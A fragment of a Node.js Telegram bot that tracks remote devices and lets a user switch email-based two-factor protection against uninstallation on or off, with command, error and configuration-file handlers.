      return ctx.reply('Use /2fa [deviceId] [on|off] [email] to enable or disable two-factor authentication for uninstallation.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const action = args[1] === 'off' ? 'off' : 'on';
    
    if (action === 'on' && !args[2]) {
      return ctx.reply('Please provide an email address for 2FA verification codes.');
    }
    
    const email = args[2] || '';
    
    await ctx.reply(`Setting two-factor authentication ${action} for device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'set_2fa',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { 
        enabled: action === 'on',
        email
      }
    });
    
    setTimeout(() => {
      if (action === 'on') {
        ctx.reply(`Two-factor authentication enabled. Verification codes will be sent to ${email}.`);
      } else {
        ctx.reply('Two-factor authentication disabled.');
      }
    }, 1000);
  });

  // Add a device to our local tracking
  bot.action(/^device:(.+)$/, (ctx) => {
    const deviceId = ctx.match[1];
    devices.set(deviceId, {
      deviceName: 'New Device',
      model: 'Unknown',
      osVersion: 'Unknown',
      lastSeen: new Date(),
      isOnline: true
    });
    
    return ctx.reply(`Device ${deviceId} has been added to tracking.`);
  });

  // Handle unknown commands
  bot.on('text', (ctx) => {
    if (ctx.message.text.startsWith('/')) {
      return ctx.reply('Unknown command. Use /help to see the available commands.');
    }
    
    // For regular messages, just acknowledge
    return ctx.reply('I can only respond to commands. Use /help to see available commands.');
  });

  // Handle errors
  bot.catch((err, ctx) => {
    console.error(`Error for ${ctx.updateType}:`, err);
    ctx.reply('An error occurred while processing your request. Please try again later.');
  });

  return bot;
}

// Update configuration in data.json
function updateConfig(updates) {
  try {
    const configPath = './data.json';
    const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    
    // Update with new values
    Object.assign(config, updates);
    
    // Write back to file
    fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
    console.log('Configuration updated successfully');
    return true;
  } catch (error) {
    console.error('Error updating configuration:', error);
    return false;
  }
}

// Expose functions
module.exports = {
  setupBot,
  devices,
  pendingRequests
};
